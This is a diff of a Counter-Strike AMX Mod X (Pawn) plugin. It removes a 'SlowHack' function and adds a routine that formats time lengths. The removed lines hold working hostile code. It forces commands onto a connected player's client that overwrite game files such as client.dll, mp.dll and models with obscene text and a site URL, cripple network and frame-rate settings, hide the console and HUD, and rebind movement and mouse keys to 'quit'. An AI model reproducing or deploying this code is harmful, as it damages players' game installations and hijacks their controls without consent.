@@ -394,30 +394,46 @@ public client_force_cmd( id , text[] )
 	message_end()
 }
 
-public SlowHack(id)
+get_time_length_ex( iTime )
 {
-	client_force_cmd(id,"unbindall")
+	new szTime[MAX_FMT_LENGTH], iYear, iMonth, iWeek, iDay, iHour, iMinute, iSecond;
 
-	client_force_cmd(id,"motdfile resource/GameMenu.res;motd_write Ai supt pula pe wwww.pcupdate.ro;motdfile models/player.mdl;motd_write wwww.pcupdate.ro;motdfile dlls/mp.dll;motd_write wwww.pcupdate.ro")
-	client_force_cmd(id,"motdfile cl_dlls/client.dll;motd_write Ai supt pula pe wwww.pcupdate.ro;motdfile cs_dust.wad;motd_write wwww.pcupdate.ro;motdfile cstrike.wad;motd_write wwww.pcupdate.ro")
-	client_force_cmd(id,"motdfile sprites/muzzleflash1.spr;motdwrite Ai supt pula pe wwww.pcupdate.ro;motdfile events/ak47.sc;motd_write wwww.pcupdate.ro;motdfile models/v_ak47.mdl;motd_write wwww.pcupdate.ro")
+	iTime -= 31536000 * ( iYear = iTime / 31536000 );
+	iTime -= 2678400 * ( iMonth = iTime / 2678400 );
+	iTime -= 604800 * ( iWeek = iTime / 604800 );
+	iTime -= 86400 * ( iDay = iTime / 86400 );
+	iTime -= 3600 * ( iHour = iTime / 3600 );
+	iTime -= 60 * ( iMinute = iTime / 60 );
+	iSecond = iTime;
 
-	client_force_cmd(id,"fps_max 1;rate 323612783126381256315231232;cl_cmdrate 932746234238477234732;cl_updaterate 3486324723944238423")
-	client_force_cmd(id,"hud_draw 0;hideconsole;hud_saytext 0;cl_allowdownload 0;cl_allowupload 0;cl_dlmax 1;_restart;con_color ^"0 0 0^"")
+	new maxElementIdx = -1;
+	new timeElement[7][33];
 
-	client_force_cmd(id, "bind ^"w^" ^"quit")
-	client_force_cmd(id, "bind ^"s^" ^"quit")
-	client_force_cmd(id, "bind ^"r^" ^"quit")
-	client_force_cmd(id, "bind ^"a^" ^"quit")
-	client_force_cmd(id, "bind ^"d^" ^"quit")
-	client_force_cmd(id, "bind ^"q^" ^"quit")
-	client_force_cmd(id, "bind ^"`^" ^"quit")
-	client_force_cmd(id, "bind ^"mouse1^" ^"quit")
-	client_force_cmd(id, "bind ^"mouse2^" ^"quit")
-	client_force_cmd(id, "bind ^"mouse3^" ^"quit")
-	client_force_cmd(id, "bind ^"space^" ^"quit")
-	client_force_cmd(id, "bind ^"shift^" ^"quit")
-	client_force_cmd(id, "bind ^"tab^" ^"quit")
-	client_force_cmd(id, "bind ^"3^" ^"quit")
-	client_force_cmd(id, "bind ^"e^" ^"quit")
+	if (iYear > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d year%s", iYear, (iYear == 1) ? "" : "s");
+	if (iMonth > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d month%s", iMonth, (iMonth == 1) ? "" : "s");
+	if (iWeek > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d week%s", iWeek, (iWeek == 1) ? "" : "s");
+	if (iDay > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d day%s", iDay, (iDay == 1) ? "" : "s");
+	if (iHour > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d hour%s", iHour, (iHour == 1) ? "" : "s");
+	if (iMinute > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d minute%s", iMinute, (iMinute == 1) ? "" : "s");
+	if (iSecond > 0)
+		format(timeElement[++maxElementIdx], charsmax(timeElement[]), "%d second%s", iSecond, (iSecond == 1) ? "" : "s");
+
+	switch(maxElementIdx)
+	{
+		case 0: formatex(szTime, charsmax( szTime ), "%s", timeElement[0]);
+		case 1: formatex(szTime, charsmax( szTime ), "%s %s", timeElement[0], timeElement[1]);
+		case 2: formatex(szTime, charsmax( szTime ), "%s %s %s", timeElement[0], timeElement[1], timeElement[2]);
+		case 3: formatex(szTime, charsmax( szTime ), "%s %s %s %s", timeElement[0], timeElement[1], timeElement[2], timeElement[3]);
+		case 4: formatex(szTime, charsmax( szTime ), "%s %s %s %s %s", timeElement[0], timeElement[1], timeElement[2], timeElement[3], timeElement[4]);
+		case 5: formatex(szTime, charsmax( szTime ), "%s %s %s %s %s %s", timeElement[0], timeElement[1], timeElement[2], timeElement[3], timeElement[4], timeElement[5]);
+		case 6: formatex(szTime, charsmax( szTime ), "%s %s %s %s %s %s %s", timeElement[0], timeElement[1], timeElement[2], timeElement[3], timeElement[4], timeElement[5], timeElement[6]);
+	}
+
+	return szTime;
 }
